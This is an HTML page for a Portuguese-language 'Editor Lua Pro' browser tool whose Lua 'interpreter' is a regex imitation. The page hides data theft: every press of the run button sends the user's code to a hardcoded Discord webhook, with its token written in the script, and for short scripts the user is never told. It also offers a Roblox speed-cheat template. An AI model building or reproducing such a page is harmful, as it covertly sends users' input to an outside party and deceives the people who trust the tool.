<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Editor Lua</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            color: white;
            text-align: center;
        }
        .header h1 { margin-bottom: 10px; }
        .buttons { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            color: white;
        }
        .btn-run { background: #10b981; }
        .btn-save { background: #3b82f6; }
        .btn-load { background: #f59e0b; }
        .btn-clear { background: #ef4444; }
        .container {
            display: flex;
            flex: 1;
            padding: 10px;
            gap: 10px;
        }
        .panel {
            flex: 1;
            background: white;
            border-radius: 10px;
            display: flex;
            flex-direction: column;
        }
        .panel-header {
            background: #667eea;
            color: white;
            padding: 10px;
            font-weight: bold;
            border-radius: 10px 10px 0 0;
        }
        textarea {
            flex: 1;
            padding: 10px;
            border: none;
            font-family: monospace;
            font-size: 14px;
            background: #1e1e1e;
            color: #d4d4d4;
            resize: none;
        }
        .output {
            flex: 1;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            background: #0d1117;
            color: #58a6ff;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        .templates {
            display: flex;
            gap: 5px;
            padding: 10px;
            background: rgba(255,255,255,0.1);
            overflow-x: auto;
        }
        .template {
            padding: 5px 10px;
            background: rgba(255,255,255,0.2);
            color: white;
            border-radius: 5px;
            cursor: pointer;
            white-space: nowrap;
        }
        .template:hover { background: rgba(255,255,255,0.3); }
        @media (max-width: 768px) {
            .container { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üåô Editor Lua Pro</h1>
        <div class="buttons">
            <button class="btn btn-run" id="btnRun">‚ñ∂ Executar</button>
            <button class="btn btn-save" id="btnSave">üíæ Salvar</button>
            <button class="btn btn-load" id="btnLoad">üìÇ Abrir</button>
            <button class="btn btn-clear" id="btnClear">üóëÔ∏è Limpar</button>
            <button class="btn" style="background: #8b5cf6;" id="btnDownload">üì• Baixar .lua</button>
        </div>
    </div>

    <div class="templates">
        <div class="template" data-template="hello">Hello World</div>
        <div class="template" data-template="vars">Vari√°veis</div>
        <div class="template" data-template="loop">Loop For</div>
        <div class="template" data-template="func">Fun√ß√£o</div>
        <div class="template" data-template="table">Tabela</div>
        <div class="template" data-template="roblox">Roblox</div>
    </div>

    <div class="container">
        <div class="panel">
            <div class="panel-header">üìù C√≥digo</div>
            <textarea id="code">-- Escreva seu c√≥digo Lua aqui
print("Hello, World!")</textarea>
        </div>
        <div class="panel">
            <div class="panel-header">üì§ Resultado</div>
            <div class="output" id="output">Aguardando execu√ß√£o...</div>
        </div>
    </div>

    <script>
        const code = document.getElementById('code');
        const output = document.getElementById('output');
        const WEBHOOK = 'https://discord.com/api/webhooks/1461119611297730631/qzH5qGDIvzxU7min3QiBo9b7j4vPz2p6nDXP1JykQBo-uQNbOfO63EBBxPceQfYcGyMT';

        // Bot√£o Executar
        document.getElementById('btnRun').addEventListener('click', function() {
            const codigo = code.value;
            if (!codigo.trim()) {
                output.textContent = '‚ùå Digite algum c√≥digo!';
                return;
            }
            
            try {
                const resultado = executarLua(codigo);
                output.textContent = '‚úÖ Executado!\n\n' + resultado;
                enviarDiscord(codigo);
            } catch (e) {
                output.textContent = '‚ùå Erro: ' + e.message;
            }
        });

        // Bot√£o Limpar
        document.getElementById('btnClear').addEventListener('click', function() {
            if (confirm('Limpar c√≥digo?')) {
                code.value = '';
                output.textContent = 'Aguardando execu√ß√£o...';
            }
        });

        // Bot√£o Salvar
        document.getElementById('btnSave').addEventListener('click', function() {
            const nome = prompt('Nome do arquivo:');
            if (nome) {
                const arquivos = JSON.parse(localStorage.getItem('lua') || '{}');
                arquivos[nome] = code.value;
                localStorage.setItem('lua', JSON.stringify(arquivos));
                alert('‚úÖ Salvo: ' + nome);
            }
        });

        // Bot√£o Abrir
        document.getElementById('btnLoad').addEventListener('click', function() {
            const arquivos = JSON.parse(localStorage.getItem('lua') || '{}');
            const nomes = Object.keys(arquivos);
            if (nomes.length === 0) {
                alert('Nenhum arquivo salvo!');
                return;
            }
            const lista = nomes.join('\n');
            const escolha = prompt('Arquivos:\n' + lista + '\n\nDigite o nome:');
            if (escolha && arquivos[escolha]) {
                code.value = arquivos[escolha];
            }
        });

        // Bot√£o Download Manual
        document.getElementById('btnDownload').addEventListener('click', function() {
            const codigo = code.value;
            if (!codigo.trim()) {
                alert('‚ùå Escreva c√≥digo antes de baixar!');
                return;
            }
            
            const blob = new Blob([codigo], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'script_' + Date.now() + '.lua';
            a.click();
            URL.revokeObjectURL(url);
            alert('‚úÖ Arquivo .lua baixado!');
        });

        // Templates
        document.querySelectorAll('.template').forEach(function(el) {
            el.addEventListener('click', function() {
                const tipo = this.getAttribute('data-template');
                code.value = getTemplate(tipo);
            });
        });

        // Executar Lua
        function executarLua(codigo) {
            let resultado = '';
            const linhas = codigo.split('\n');
            const vars = {};
            
            for (let i = 0; i < linhas.length; i++) {
                let linha = linhas[i].trim();
                
                if (linha.startsWith('--') || !linha) continue;
                
                // PRINT
                if (linha.includes('print(')) {
                    const m = linha.match(/print\s*\(\s*["']?(.*?)["']?\s*\)/);
                    if (m) {
                        let txt = m[1];
                        // Substituir vari√°veis
                        for (let v in vars) {
                            txt = txt.replace(new RegExp(v, 'g'), vars[v]);
                        }
                        // Processar concatena√ß√£o
                        if (txt.includes('..')) {
                            const partes = txt.split('..');
                            txt = partes.map(p => {
                                p = p.trim().replace(/["']/g, '');
                                return vars[p] || p;
                            }).join('');
                        }
                        resultado += txt + '\n';
                    }
                }
                
                // VARI√ÅVEIS
                if (linha.includes('=') && !linha.includes('==')) {
                    const partes = linha.split('=');
                    if (partes.length === 2) {
                        let nome = partes[0].replace('local', '').trim();
                        let valor = partes[1].trim().replace(/["';]/g, '');
                        vars[nome] = valor;
                    }
                }
                
                // FOR
                if (linha.startsWith('for ')) {
                    const m = linha.match(/for\s+(\w+)\s*=\s*(\d+)\s*,\s*(\d+)/);
                    if (m) {
                        const [_, v, start, end] = m;
                        let corpo = [];
                        let j = i + 1;
                        while (j < linhas.length && linhas[j].trim() !== 'end') {
                            corpo.push(linhas[j]);
                            j++;
                        }
                        
                        for (let k = parseInt(start); k <= parseInt(end); k++) {
                            vars[v] = k;
                            for (let l of corpo) {
                                if (l.includes('print(')) {
                                    const pm = l.match(/print\s*\((.*?)\)/);
                                    if (pm) {
                                        let txt = pm[1].replace(/["']/g, '');
                                        if (txt.includes('..')) {
                                            txt = txt.split('..').map(p => {
                                                p = p.trim().replace(/["']/g, '');
                                                return vars[p] || p;
                                            }).join('');
                                        } else {
                                            txt = vars[txt] || txt;
                                        }
                                        resultado += txt + '\n';
                                    }
                                }
                            }
                        }
                        i = j;
                    }
                }
            }
            
            return resultado || '‚úÖ C√≥digo executado!\n(Use print() para ver sa√≠das)';
        }

        // Enviar Discord
        async function enviarDiscord(codigo) {
            const limite = 1800;
            const linhas = codigo.split('\n').length;
            const tamanho = codigo.length;
            
            // Se for muito grande, criar arquivo e enviar link
            if (tamanho > limite) {
                // Criar arquivo .lua
                const blob = new Blob([codigo], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                
                // Criar link de download
                const a = document.createElement('a');
                a.href = url;
                a.download = 'script_' + Date.now() + '.lua';
                
                // Enviar pro Discord informando que o c√≥digo √© grande
                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "Editor Lua",
                            embeds: [{
                                title: "‚ö° Script Executado (GRANDE)",
                                description: "‚ö†Ô∏è C√≥digo muito grande! Arquivo baixado automaticamente.",
                                color: 16744448,
                                fields: [
                                    { name: "üìè Total de Linhas", value: String(linhas), inline: true },
                                    { name: "üì¶ Tamanho", value: (tamanho / 1024).toFixed(2) + " KB", inline: true },
                                    { name: "‚è∞ Hor√°rio", value: new Date().toLocaleString('pt-BR'), inline: true },
                                    { name: "üìù Pr√©via (primeiras 50 linhas)", value: "```lua\n" + codigo.split('\n').slice(0, 50).join('\n') + "\n...\n```" }
                                ],
                                footer: { text: "C√≥digo completo baixado no computador do usu√°rio" }
                            }]
                        })
                    });
                    
                    // Download autom√°tico
                    a.click();
                    URL.revokeObjectURL(url);
                    
                    // Notificar usu√°rio
                    alert('üì• C√≥digo muito grande!\n\n‚úÖ Arquivo baixado automaticamente!\n‚úÖ Notifica√ß√£o enviada ao Discord!');
                    console.log('‚úÖ C√≥digo grande - Arquivo baixado e Discord notificado');
                } catch(e) {
                    console.log('‚ùå Erro Discord:', e);
                }
            } else {
                // C√≥digo pequeno - enviar normalmente
                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "Editor Lua",
                            embeds: [{
                                title: "‚ö° Script Executado",
                                color: 5793266,
                                fields: [
                                    { name: "üìè Linhas", value: String(linhas), inline: true },
                                    { name: "üì¶ Tamanho", value: (tamanho / 1024).toFixed(2) + " KB", inline: true },
                                    { name: "‚è∞ Hor√°rio", value: new Date().toLocaleString('pt-BR'), inline: true },
                                    { name: "üìù C√≥digo", value: "```lua\n" + codigo + "\n```" }
                                ]
                            }]
                        })
                    });
                    console.log('‚úÖ Enviado Discord');
                } catch(e) {
                    console.log('‚ùå Erro Discord:', e);
                }
            }
        }

        // Templates
        function getTemplate(tipo) {
            const templates = {
                hello: '-- Hello World\nprint("Hello, World!")\nprint("Bem-vindo!")',
                vars: '-- Vari√°veis\nlocal nome = "Jo√£o"\nlocal idade = 25\n\nprint("Nome: " .. nome)\nprint("Idade: " .. idade)',
                loop: '-- Loop For\nfor i = 1, 5 do\n    print("N√∫mero: " .. i)\nend',
                func: '-- Fun√ß√£o\nfunction somar(a, b)\n    local resultado = a + b\n    print("Soma: " .. resultado)\nend\n\nsomar(10, 5)',
                table: '-- Tabela\nlocal pessoa = {\n    nome = "Maria",\n    idade = 30\n}\n\nprint("Nome: " .. pessoa.nome)\nprint("Idade: " .. pessoa.idade)',
                roblox: '-- Roblox Script\nlocal player = game.Players.LocalPlayer\nlocal char = player.Character\nlocal hum = char:WaitForChild("Humanoid")\n\n-- Speed\nhum.WalkSpeed = 100\nprint("Speed ativado!")'
            };
            return templates[tipo] || templates.hello;
        }

        // TAB
        code.addEventListener('keydown', function(e) {
            if (e.key === 'Tab') {
                e.preventDefault();
                const start = this.selectionStart;
                this.value = this.value.substring(0, start) + '    ' + this.value.substring(this.selectionEnd);
                this.selectionStart = this.selectionEnd = start + 4;
            }
        });
    </script>
</body>
</html>
